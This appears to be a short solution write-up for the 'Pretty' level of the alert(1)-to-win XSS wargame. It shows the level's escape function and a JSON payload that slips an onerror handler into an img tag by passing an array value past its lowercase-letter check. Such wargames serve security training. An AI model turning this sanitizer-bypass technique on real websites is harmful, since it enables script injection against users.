# alert-1-to-win
solutions for xss wargame alert(1) to win https://alf.nu/alert1

## Pretty (32)
I know many people already solved this level, but since I couldn't find payload on the internet so I decided to upload it.
```
function escape(input) {
  const quote = s => s.replace(/[<>"]/gu, x => '&#'+x.codePointAt(0)+';');
  const safe = {src:1, alt:1};
  const o = JSON.parse(input);
  let s = '<img';
  
  for (const k in o) {
    if(!safe[k]) continue;
    s += ' ' + k + '=';
    if ([...o[k]].every(x => x >= 'a' && x <= 'z')) {
       s += o[k];
    } else {
       s += '"' + quote(o[k]) + '"';
    }
  }
  return s+'>hello</span>';
}
```
input:
```
{ "src": ["a onerror=alert(1)"]}
```
output:
```
<img src=a onerror=alert(1)>hello</span>
```
